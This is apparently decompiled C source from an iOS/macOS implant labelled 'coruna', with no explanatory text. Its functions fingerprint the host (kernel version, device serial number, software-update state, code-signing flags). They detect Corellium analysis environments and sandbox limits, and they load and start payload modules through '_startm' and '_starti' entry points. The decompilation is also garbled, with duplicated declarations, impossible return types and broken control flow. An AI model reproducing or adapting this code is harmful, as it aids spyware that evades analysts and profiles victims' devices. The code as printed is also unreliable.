  host_info[0x84] = '\0';
  host_info[0x85] = '\0';
  host_info[0x86] = '\0';
  host_info[0x87] = '\0';
  host_info[0x98] = '\0';
  host_info[0x99] = '\0';
  host_info[0x9a] = '\0';
  host_info[0x9b] = '\0';
  host_info[0x9c] = '\0';
  host_info[0x9d] = '\0';
  host_info[0x9e] = '\0';
  host_info[0x9f] = '\0';
  host_info[0x90] = '\0';
  host_info[0x91] = '\0';
  host_info[0x92] = '\0';
  host_info[0x93] = '\0';
  host_info[0x94] = '\0';
  host_info[0x95] = '\0';
  host_info[0x96] = '\0';
  host_info[0x97] = '\0';
  host_info[0x78] = '\0';
  host_info[0x79] = '\0';
  host_info[0x7a] = '\0';
  host_info[0x7b] = '\0';
  host_info[0x7c] = '\0';
  host_info[0x7d] = '\0';
  host_info[0x7e] = '\0';
  host_info[0x7f] = '\0';
  host_info[0x70] = '\0';
  host_info[0x71] = '\0';
  host_info[0x72] = '\0';
  host_info[0x73] = '\0';
  host_info[0x74] = '\0';
  host_info[0x75] = '\0';
  host_info[0x76] = '\0';
  host_info[0x77] = '\0';
  host_info[0x58] = '\0';
  host_info[0x59] = '\0';
  host_info[0x5a] = '\0';
  host_info[0x5b] = '\0';
  host_info[0x5c] = '\0';
  host_info[0x5d] = '\0';
  host_info[0x5e] = '\0';
  host_info[0x5f] = '\0';
  host_info[0x50] = '\0';
  host_info[0x51] = '\0';
  host_info[0x52] = '\0';
  host_info[0x53] = '\0';
  host_info[0x54] = '\0';
  host_info[0x55] = '\0';
  host_info[0x56] = '\0';
  host_info[0x57] = '\0';
  host_info[0x68] = '\0';
  host_info[0x69] = '\0';
  host_info[0x6a] = '\0';
  host_info[0x6b] = '\0';
  host_info[0x6c] = '\0';
  host_info[0x6d] = '\0';
  host_info[0x6e] = '\0';
  host_info[0x6f] = '\0';
  host_info[0x60] = '\0';
  host_info[0x61] = '\0';
  host_info[0x62] = '\0';
  host_info[99] = '\0';
  host_info[100] = '\0';
  host_info[0x65] = '\0';
  host_info[0x66] = '\0';
  host_info[0x67] = '\0';
  host_info[0x38] = '\0';
  host_info[0x39] = '\0';
  host_info[0x3a] = '\0';
  host_info[0x3b] = '\0';
  host_info[0x3c] = '\0';
  host_info[0x3d] = '\0';
  host_info[0x3e] = '\0';
  host_info[0x3f] = '\0';
  host_info[0x30] = '\0';
  host_info[0x31] = '\0';
  host_info[0x32] = '\0';
  host_info[0x33] = '\0';
  host_info[0x34] = '\0';
  host_info[0x35] = '\0';
  host_info[0x36] = '\0';
  host_info[0x37] = '\0';
  host_info[0x48] = '\0';
  host_info[0x49] = '\0';
  host_info[0x4a] = '\0';
  host_info[0x4b] = '\0';
  host_info[0x4c] = '\0';
  host_info[0x4d] = '\0';
  host_info[0x4e] = '\0';
  host_info[0x4f] = '\0';
  host_info[0x40] = '\0';
  host_info[0x41] = '\0';
  host_info[0x42] = '\0';
  host_info[0x43] = '\0';
  host_info[0x44] = '\0';
  host_info[0x45] = '\0';
  host_info[0x46] = '\0';
  host_info[0x47] = '\0';
  host_info[0x18] = '\0';
  host_info[0x19] = '\0';
  host_info[0x1a] = '\0';
  host_info[0x1b] = '\0';
  host_info[0x1c] = '\0';
  host_info[0x1d] = '\0';
  host_info[0x1e] = '\0';
  host_info[0x1f] = '\0';
  host_info[0x10] = '\0';
  host_info[0x11] = '\0';
  host_info[0x12] = '\0';
  host_info[0x13] = '\0';
  host_info[0x14] = '\0';
  host_info[0x15] = '\0';
  host_info[0x16] = '\0';
  host_info[0x17] = '\0';
  host_info[0x28] = '\0';
  host_info[0x29] = '\0';
  host_info[0x2a] = '\0';
  host_info[0x2b] = '\0';
  host_info[0x2c] = '\0';
  host_info[0x2d] = '\0';
  host_info[0x2e] = '\0';
  host_info[0x2f] = '\0';
  host_info[0x20] = '\0';
  host_info[0x21] = '\0';
  host_info[0x22] = '\0';
  host_info[0x23] = '\0';
  host_info[0x24] = '\0';
  host_info[0x25] = '\0';
  host_info[0x26] = '\0';
  host_info[0x27] = '\0';
  host_info[8] = '\0';
  host_info[9] = '\0';
  host_info[10] = '\0';
  host_info[0xb] = '\0';
  host_info[0xc] = '\0';
  host_info[0xd] = '\0';
  host_info[0xe] = '\0';
  host_info[0xf] = '\0';
  host_info[0] = '\0';
  host_info[1] = '\0';
  host_info[2] = '\0';
  host_info[3] = '\0';
  host_info[4] = '\0';
  host_info[5] = '\0';
  host_info[6] = '\0';
  host_info[7] = '\0';
  host = _mach_host_self();
  u = _host_kernel_version(host,host_info);
  if (u == 0) {
done:
    ptr = _strstr(host_info,"RELEASE");
    if (ptr == (char *)0x0) {
      u = 0xad008;
    }
    else {
      ptr = _strstr(host_info,"xnu-");
      u = 0xad014;
      if (ptr != (char *)0x0) {
        bootargs = 0;
        scratch = 0;
        err = _sscanf(ptr,"xnu-%u.%u.%u%*s");
        if (err == 3) {
          u = 0;
          *len = scratch;
          *(uint32_t *)(len + 1) = bootargs;
        }
      }
    }
  }
  else {
    if (u == 0x35) {
      thread_attr = k_implant_rodata_word_1e880;
      scratch = 0x200;
      err = _sysctl((int *)&thread_attr,2,host_info,&scratch,(void *)0x0,0);
      if (err == 0) {
        ptr = _strstr(host_info,"RELEASE");
        if (ptr == (char *)0x0) {
          u = 0xad008;
        }
        else {
          ptr = _strstr(host_info,"xnu-");
          u = 0xad014;
          if (ptr != (char *)0x0) {
            bootargs = 0;
            scratch = 0;
            err = _sscanf(ptr,"xnu-%u.%u.%u%*s");
            if (err == 3) {
              u = 0;
              *len = scratch;
              *(uint32_t *)(len + 1) = bootargs;
            }
          }
        }
      }
      else {
        u = u | 0x80000000;
      }
    }
    else {
      u = u | 0x80000000;
    }
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
    return u;
  }
  ___stack_chk_fail();
}





uint64_t coruna_strncpy(long handle,char *path,uint *size)
{
  size_t ls1;
  long handle;
  uint64_t u;
  char *ptr;
  uint size;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && size != (uint *)0x0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    ptr = *(char **)(handle + 0x38);
    if (ptr == (char *)0x0) {
      size = 0;
    }
    else {
      ls1 = _strlen(ptr);
      size = (int)ls1 + 1;
      if (path != (char *)0x0) {
        if (*size < size) {
          return 0xad00c;
        }
        _strncpy(path,ptr,(unsigned long)*size);
      }
    }
    u = 0;
    *size = size;
  }
  return u;
}





uint64_t coruna_bzero_b1e0(long handle)
{
  uint64_t u;
  size_t ls2;
  char *ptr;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    ptr = *(char **)(handle + 0x38);
    if (ptr == (char *)0x0) {
      u = 0;
    }
    else {
      ls2 = _strlen(ptr);
      _bzero(ptr,ls2);
      _free(*(void **)(handle + 0x38));
      u = 0;
      *(uint64_t *)(handle + 0x38) = 0;
    }
  }
  return u;
}





uint64_t coruna_strncpy_2(long handle,char *path,uint *size)
{
  size_t ls1;
  long handle;
  uint64_t u;
  char *ptr;
  uint size;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && size != (uint *)0x0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    ptr = *(char **)(handle + 0x48);
    if (ptr == (char *)0x0) {
      size = 0;
    }
    else {
      ls1 = _strlen(ptr);
      size = (int)ls1 + 1;
      if (path != (char *)0x0) {
        if (*size < size) {
          return 0xad00c;
        }
        _strncpy(path,ptr,(unsigned long)*size);
      }
    }
    u = 0;
    *size = size;
  }
  return u;
}





uint64_t coruna_bzero_b2fc(long handle)
{
  uint64_t u;
  size_t ls2;
  char *ptr;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    ptr = *(char **)(handle + 0x48);
    if (ptr == (char *)0x0) {
      u = 0;
    }
    else {
      ls2 = _strlen(ptr);
      _bzero(ptr,ls2);
      _free(*(void **)(handle + 0x48));
      u = 0;
      *(uint64_t *)(handle + 0x48) = 0;
    }
  }
  return u;
}





uint64_t coruna_implant_residual_56(long handle,uint8_t *buf)
{
  uint64_t u;
  
  u = 0xad001;
  if ((handle != 0) && (*(long *)(handle + 8) != 0 && buf != (uint8_t *)0x0)) {
    if (*(char *)(*(long *)(handle + 8) + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = 0;
    *buf = 1;
  }
  return u;
}





uint64_t coruna_implant_residual_57(long handle,char *path,uint64_t val,long addr_2)
{
  uint64_t u;
  long handle;
  
  if (((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && path != (char *)0x0)) &&
     (*path != '\0' && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x38))(*(long *)(handle + 8),path,addr_2);
    return u;
  }
  return 0xad001;
}





unsigned long coruna_run_startm(long arg,uint64_t val)

{
  uint u;
  uint size;
  uint type_id_8;
  unsigned long version;
  long *str;
  uint cache_40;
  mach_port_name_t cache;
  uint cache_41;
  void *cache_20;
  uint32_t cache_42;
  uint64_t cache_43;
  
  version = 0xad001;
  if ((arg != 0) && (str = *(long **)(arg + 8), str != (long *)0x0)) {
    cache_43 = 0;
    cache_42 = 0;
    if ((char)str[8] != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    version = (**(void (**)(*str + 0x18))(*str,0x80000,&cache_43,&cache_42);
    if ((int)version == 0) {
      cache_20 = (void *)0x0;
      cache_41 = 0;
      version = (**(void (**)(*str + 0x20))(*str,&cache_20,&cache_41);
      if ((int)version == 0) {
        cache = 0;
        version = (**(void (**)(str[1] + 0x48))
                          (str[1],val,cache_43,cache_42,"_startm",cache_20,cache_41,0,
                           &cache);
        if ((int)version == 0) {
          cache_40 = 0xad000;
          type_id_8 = (**(void (**)(str[1] + 0x58))(str[1],cache,2000,&cache_40);
          u = 0;
          if (type_id_8 != 0x1e02a) {
            u = type_id_8;
          }
          size = cache_40;
          if (type_id_8 != 0) {
            size = u;
          }
          version = (unsigned long)size;
          _mach_port_mod_refs(*(ipc_space_t *)k_implant_mach_task_self_slot,cache,1,-1);
        }
        _bzero(cache_20,(unsigned long)cache_41);
        _free(cache_20);
      }
    }
  }
  return version;
}





void coruna_csops(long handle,byte *arg)
{
  pid_t lp1;
  int err;
  uint u;
  int *err;
  uint *ptr;
  byte err;
  uint8_t scratch[3];
  byte bootargs;
  uint64_t thread_attr;
  uint64_t scratch;
  uint32_t host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_implant_stack_chk_guard_slot;
  thread_attr = 0;
  scratch = 0;
  host_info = 0;
  u = 0xad001;
  if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
  return;
  }
  ___stack_chk_fail(u);
  if (k_implant_rodata_word_1e888 <= *(double *)k_implant_dyldversionnumber_slot) {
    lp1 = _getpid();
    err = _csops(lp1,0,scratch,4);
    if (err < 0) goto done;
    err = bootargs >> 5 & 1;
  }
  else {
    lp1 = _getpid();
    err = _csops(lp1,5,&thread_attr,0x14);
    if (err < 0) {
      err = ___error();
      if (*err == 0x55) {
        u = 0;
        *arg = 0;
        if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
        return;
        }
        ___stack_chk_fail(u);
      }
done:
      err = ___error();
      err = *err;
      ptr = (uint *)___error();
      u = -*ptr;
      if (-1 < err) {
        u = *ptr;
      }
      u = u | 0x40000000;
      if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
      return;
      }
      ___stack_chk_fail(u);
    }
    err = 1;
  }
  u = 0;
  *arg = err;
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
    return;
  }
  ___stack_chk_fail(u);
}





uint64_t coruna_implant65fc_via_closedir_bd88(long handle,uint8_t *buf)
{
  uint64_t u;
  uint8_t scratch;
  
  u = 0xad001;
  if ((handle != 0) && (*(long *)(handle + 8) != 0 && buf != (uint8_t *)0x0)) {
    if (*(char *)(*(long *)(handle + 8) + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    scratch = 0;
    u = coruna_closedir_bd88(&scratch);
    if ((int)u == 0) {
      *buf = scratch;
    }
  }
  return u;
}





void coruna_implant_via_host_get_special_port(long handle,uint8_t *buf)
{
  uint64_t u;
  int *err;
  long handle;
  long addr;
  long off;
  uint scratch [2];
  int *bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_implant_stack_chk_guard_slot;
  u = 0xad001;
  if ((handle == 0) || (off = *(long *)(handle + 8), off == 0 || buf == (uint8_t *)0x0)
     if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
     return;
     }
     ___stack_chk_fail(u);
  addr = off;
  if (*(char *)(off + 0x40) != '\0') {
    UnkSytemRegWrite(3,4,0xf,2,7,0);
    InstructionSynchronizationBarrier();
    addr = *(long *)(handle + 8);
    if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
    return;
    }
    ___stack_chk_fail(u);
  }
  err = (int *)(addr + 0x44);
  if (*err + 1U < 2) {
    scratch[0] = 0x8000001c;
    handle = *(long *)(addr + 0x18);
    bootargs = err;
    if (handle == 0) {
      u = 0xad00a;
      if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
      return;
      }
      ___stack_chk_fail(u);
    }
    u = (**(void (**)(handle + 0x40))(handle,addr + 0x20,scratch,1,0);
    if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
    return;
    }
    ___stack_chk_fail(u);
  }
  scratch[0] = scratch[0] & 0xffffff00;
  u = coruna_host_get_special_port(*(uint32_t *)(off + 0x44),scratch);
  if ((int)u == 0) {
    *buf = (uint8_t)scratch[0];
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(u);
}





uint64_t
void coruna_implant65fc_residual_96(long handle,int flags,long addr_2,int count_2,long off_3,long ctx_4,int fd_3
            )
{
  uint64_t u;
  long handle;
  
  if (((handle == 0) ||
      (handle = *(long *)(handle + 8),
      ((((handle == 0 || flags == 0) || flags == -1) || addr_2 == 0) || count_2 == 0) ||
      off_3 == 0)) || ((ctx_4 == 0) == (fd_3 != 0))) {
    u = 0xad001;
  }
  else {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x40))();
  }
  return u;
}





uint64_t
void coruna_implant65fc_residual_97(long handle,int flags,long addr_2,int count_2,long off_3,long ctx_4,int fd_3
            )
{
  uint64_t u;
  long handle;
  
  if (((handle == 0) ||
      (handle = *(long *)(handle + 8),
      (((handle == 0 || flags < 1) || addr_2 == 0) || count_2 == 0) || off_3 == 0)) ||
     ((ctx_4 == 0) == (fd_3 != 0))) {
    u = 0xad001;
  }
  else {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x48))();
  }
  return u;
}





uint64_t
void coruna_implant65fc_residual_98(long handle,long addr_2,uint64_t val,long off_3,int flags,long ctx_4,
            long ctx_5,int count_2)
{
  uint64_t u;
  long handle;
  
  if (((handle == 0) ||
      (handle = *(long *)(handle + 8),
      (((handle == 0 || addr_2 == 0) || off_3 == 0) || flags == 0) || ctx_4 == 0)) ||
     ((ctx_5 == 0) == (count_2 != 0))) {
    u = 0xad001;
  }
  else {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x50))();
  }
  return u;
}





uint64_t coruna_implant65fc_residual_99(long handle,int flags,uint64_t val,long addr_2)
{
  uint64_t u;
  long handle;
  
  if ((handle != 0) &&
     (handle = *(long *)(handle + 8),
     ((handle != 0 && flags != 0) && flags != -1) && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x58))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant_residual_61(long handle,char *path,long addr_2)
{
  uint64_t u;
  long handle;
  
  if (((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && path != (char *)0x0)) &&
     (*path != '\0' && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x38))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant_residual_62(long handle,char *path,uint64_t val,long addr_2)
{
  uint64_t u;
  long handle;
  
  if (((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && path != (char *)0x0)) &&
     (*path != '\0' && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x60))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_run_starti(long handle)
{
  uint64_t *ptr;
  uint64_t *buf;
  short *lps3;
  uint64_t u;
  long handle;
  void (*scratch)(void);
  uint32_t bootargs;
  uint64_t thread_attr;
  uint32_t host_info;
  uint64_t serial_buf;
  uint32_t action;
  uint64_t block_ctx;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0)) {
    block_ctx = 0;
    action = 0;
    u = (**(void (**)(handle + 0x68))(handle,0x30000,&block_ctx,&action);
    if ((int)u == 0x7003) {
      u = 0xad006;
    }
    else if ((int)u == 0) {
      if (*(long *)(handle + 0x18) == 0) {
        u = 0xad00a;
      }
      else {
        serial_buf = 0;
        host_info = 0;
        u = (**(void (**)(handle + 0x68))(handle,0x40000,&serial_buf,&host_info);
        if ((int)u == 0) {
          thread_attr = 0;
          bootargs = 0;
          u = (**(void (**)(handle + 0x68))(handle,0x90000,&thread_attr,&bootargs);
          if ((int)u == 0) {
            ptr = (uint64_t *)(handle + 0x28);
            u = (**(void (**)(handle + 0x50))(handle,block_ctx,action,ptr);
            if ((int)u == 0) {
              scratch = (void (*)0x0;
              u = (**(void (**)(handle + 0x58))(handle,*ptr,"_starti",&scratch);
              if ((int)u == 0) {
                buf = (uint64_t *)(handle + 0x30);
                u = (*scratch)(buf,serial_buf,host_info,thread_attr,bootargs,
                                    *(uint64_t *)(handle + 0x18),*(uint64_t *)(handle + 0x20));
                if ((int)u == 0) {
                  lps3 = (short *)*buf;
                  if (((lps3 != (short *)0x0) && (*lps3 == 4)) && (lps3[1] != 0)) {
                    return 0;
                  }
                  *buf = 0;
                  u = 0xad006;
                }
              }
              (**(void (**)(handle + 0x60))(handle,*ptr);
              *ptr = 0;
            }
          }
        }
      }
    }
  }
  return u;
}





uint64_t coruna_implant65fc_residual_100(long handle,uint64_t *val)
{
  uint32_t *ptr;
  uint64_t u;
  
  u = 0xad001;
  if ((handle != 0) && (val != (uint64_t *)0x0)) {
    ptr = _calloc(1,0x50);
    if (ptr == (uint32_t *)0x0) {
      u = 0xad009;
    }
    else {
      u = 0;
      *ptr = 0x20002;
      *(long *)(ptr + 2) = handle;
      ((void (**)(void *, long, uint64_t))(ptr + 4))[0] = coruna_ctx_free_bc88;
      ((void (**)(void *, long, uint64_t))(ptr + 6))[0] = coruna_implant65fc_residual_101;
      ((void (**)(void *, long, uint64_t))(ptr + 8))[0] = coruna_implant65fc_residual_102;
      ((void (**)(void *, long, uint64_t))(ptr + 10))[0] = coruna_implant65fc_residual_103;
      ((void (**)(void *, long, uint64_t))(ptr + 0xc))[0] = coruna_implant65fc_residual_104;
      ((void (**)(void *, long, uint64_t))(ptr + 0xe))[0] = coruna_implant65fc_residual_105;
      ((void (**)(void *, long, uint64_t))(ptr + 0x10))[0] = coruna_driver_free_ctx;
      ((void (**)(void *, long, uint64_t))(ptr + 0x12))[0] = coruna_dyld_port_index;
      *val = ptr;
    }
  }
  return u;
}





uint64_t coruna_ctx_free_bc88(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[1] = 0;
    *val = 0;
    _free(val);
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_ctx_free_bc8c(uint64_t *val)
{
  val[7] = 0;
  val[6] = 0;
  val[9] = 0;
  val[8] = 0;
  val[3] = 0;
  val[2] = 0;
  val[5] = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  _free(val);
  return 0;
}





uint64_t coruna_implant65fc_residual_101(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x18))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant65fc_residual_102(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x20))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant65fc_residual_103(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x28))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant65fc_residual_104(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x30))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant65fc_residual_105(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x38))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_driver_free_ctx(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x40))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_dyld_port_index(long handle,long addr_2)
{
  uint64_t u;
  
  if ((handle != 0) && (addr_2 != 0)) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x48))();
    return u;
  }
  return 0xad001;
}





uint coruna_closedir_bd88(uint8_t *buf)
{
  bool err;
  int err;
  uint u;
  int *err;
  long handle;
  long addr;
  char *ptr;
  uint *ptr;
  stat scratch;
  
  if (buf == (uint8_t *)0x0) {
    return 0xad001;
  }
  scratch.st_gen = 0;
  scratch.st_lspare = 0;
  scratch.st_blksize = 0;
  scratch.st_flags = 0;
  scratch.st_qspare[1] = 0;
  scratch.st_qspare[0] = 0;
  scratch.st_birthtimespec.tv_nsec = 0;
  scratch.st_birthtimespec.tv_sec = 0;
  scratch.st_blocks = 0;
  scratch.st_size = 0;
  scratch.st_mtimespec.tv_nsec = 0;
  scratch.st_mtimespec.tv_sec = 0;
  scratch.st_ctimespec.tv_nsec = 0;
  scratch.st_ctimespec.tv_sec = 0;
  scratch.st_rdev = 0;
  scratch = 0;
  scratch.st_uid = 0;
  scratch.st_gid = 0;
  scratch.st_atimespec.tv_nsec = 0;
  scratch.st_atimespec.tv_sec = 0;
  scratch.st_ino = 0;
  scratch.st_dev = 0;
  scratch.st_mode = 0;
  scratch.st_nlink = 0;
  err = _lstat("/private/var/MobileSoftwareUpdate/Update.plist",&scratch);
  if (err == 0) {
    *buf = 1;
    return 0;
  }
  err = ___error();
  if (*err == 2) {
    handle = _opendir("/private/var/MobileSoftwareUpdate/");
    if (handle == 0) {
      err = ___error();
      if (*err != 2) {
        err = ___error();
        err = *err;
        ptr = (uint *)___error();
        u = -*ptr;
        if (-1 < err) {
          u = *ptr;
        }
        u = u | 0x40000000;
      }
      else {
        err = false;
      }
    }
    else {
      do {
        addr = _readdir(handle);
        if (addr == 0) break;
        ptr = _strstr((char *)(addr + 0x15),"softwareupdate.");
      } while ((char *)(addr + 0x15) != ptr);
      err = addr != 0;
      _closedir(handle);
    }
    u = 0;
    *buf = err;
  }
  else {
fail:
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  return u;
}





uint coruna_host_get_special_port(host_priv_t arg,long handle)
{
  bool err;
  uint u;
  uint size;
  long handle;
  bool status;
  mach_port_t scratch;
  
  if (arg + 1 < 2 || handle == 0) {
    size = 0xad001;
  }
  else {
    handle = 0;
    scratch = 0;
    err = true;
    do {
      status = err;
      u = _host_get_special_port(arg,-1,(&k_implant_rodata_word_1e890)[handle],&scratch);
      if (u != 0) {
        return u | 0x80000000;
      }
      u = scratch + 1;
      if (1 < u) {
        _mach_port_deallocate(*(ipc_space_t *)k_implant_mach_task_self_slot,scratch);
        break;
      }
      handle = 1;
      err = false;
    } while (status);
    size = 0;
    *(bool *)handle = 1 < u;
  }
  return size;
}





void coruna_cfstringcreatewithcstring(long handle)
{
  bool err;
  int err;
  pid_t lp3;
  long handle;
  uint32_t *ptr;
  void (*ptr)(void);
  void (*buf)(void);
  void (*str)(void);
  uint64_t u;
  long addr;
  long off;
  long base;
  long ctx_val;
  uint size;
  unsigned long version;
  uint64_t port;
  stat scratch;
  long bootargs;
  unsigned long scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  long host_info;
  
  host_info = *(long *)k_implant_stack_chk_guard_slot;
  if (handle == 0) {
fail:
    u = 0xffffffff;
  }
  else {
    host_info = 0;
    thread_attr = 0;
    action = 0;
    serial_buf = 0;
    scratch = 0;
    bootargs = 0;
    thread_attr = 0;
    bootargs = 0;
    scratch.st_gen = 0;
    scratch.st_lspare = 0;
    scratch.st_blksize = 0;
    scratch.st_flags = 0;
    scratch.st_qspare[1] = 0;
    scratch.st_qspare[0] = 0;
    scratch.st_birthtimespec.tv_nsec = 0;
    scratch.st_birthtimespec.tv_sec = 0;
    scratch.st_blocks = 0;
    scratch.st_size = 0;
    scratch.st_mtimespec.tv_nsec = 0;
    scratch.st_mtimespec.tv_sec = 0;
    scratch.st_ctimespec.tv_nsec = 0;
    scratch.st_ctimespec.tv_sec = 0;
    scratch.st_rdev = 0;
    scratch = 0;
    scratch.st_uid = 0;
    scratch.st_gid = 0;
    scratch.st_atimespec.tv_nsec = 0;
    scratch.st_atimespec.tv_sec = 0;
    scratch.st_ino = 0;
    scratch.st_dev = 0;
    scratch.st_mode = 0;
    scratch.st_nlink = 0;
    err = _stat("/usr/libexec/corelliumd",&scratch);
    if (err == 0) {
      err = false;
    }
    else {
      lp3 = _getpid();
      err = _sandbox_check(lp3,"iokit-get-properties",
                             *(uint32_t *)k_implant_sandbox_check_no_report_slot);
      if ((err < 1) &&
         (handle = _dlopen("/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit",1),
         handle != 0)) {
        _dlsym(handle,"kIOMasterPortDefault");
        ptr = (uint32_t *)coruna_identity_6080();
        _dlsym(handle,"IORegistryEntryFromPath");
        ptr = (void (*)coruna_identity_6080();
        _dlsym(handle,"IORegistryEntryCreateCFProperty");
        buf = (void (*)coruna_identity_6080();
        _dlsym(handle,"IOObjectRelease");
        str = (void (*)coruna_identity_6080();
        if (((ptr == (void (*)0x0) ||
            (((buf == (void (*)0x0 || (str == (void (*)0x0)) || (ptr == (uint32_t *)0x0))))
           || (u = (*ptr)(*ptr,"IODeviceTree:/"), (int)u == 0)) {
          _dlclose(handle);
        }
        else {
          port = *(uint64_t *)k_implant_kcfallocatordefault_slot;
          addr = _CFStringCreateWithCString(port,"IOPlatformSerialNumber",0x8000100);
          if (addr == 0) {
            err = -1;
          }
          else {
            off = (*buf)(u,addr,port,0);
            if (off == 0) {
done:
              err = -1;
            }
            else {
              base = _CFStringGetTypeID();
              ctx_val = _CFGetTypeID(off);
              if (base != ctx_val) goto done;
              err = _CFStringGetCString(off,&bootargs,0x40,0x8000100);
              err = -(uint)(err == 0);
              _CFRelease(off);
            }
            _CFRelease(addr);
          }
          (*str)(u);
          _dlclose(handle);
          handle = bootargs;
          if (err == 0) {
            version = scratch & 0xff;
            host_info = 0;
            thread_attr = 0;
            action = 0;
            serial_buf = 0;
            scratch = 0;
            bootargs = 0;
            thread_attr = 0;
            bootargs = 0;
            err = false;
            u = 0;
            *(bool *)handle = err;
            }
            if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
            return;
          }
        }
      }
      handle = coruna_identity_6080(k_implant_get_cpu_capabilities_slot);
      version = *(unsigned long *)(handle + 0xc) & 0xffffffffffffff00;
      if (version == 0) goto fail;
      err = *(int *)(version + 0x80);
      if ((err == -0x6d04c838 || err == 0x37a09642) || err == 0x2c91a47e) {
        size = *(uint *)(version + 0x10) >> 0x1a & 1;
      }
      else {
        size = (uint)(*(short *)(version + 0x26) != 0x80);
      }
      err = size == 0;
    }
cleanup:
    u = 0;
    *(bool *)handle = err;
  }
  if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return;
  }
  ___stack_chk_fail(u);
}





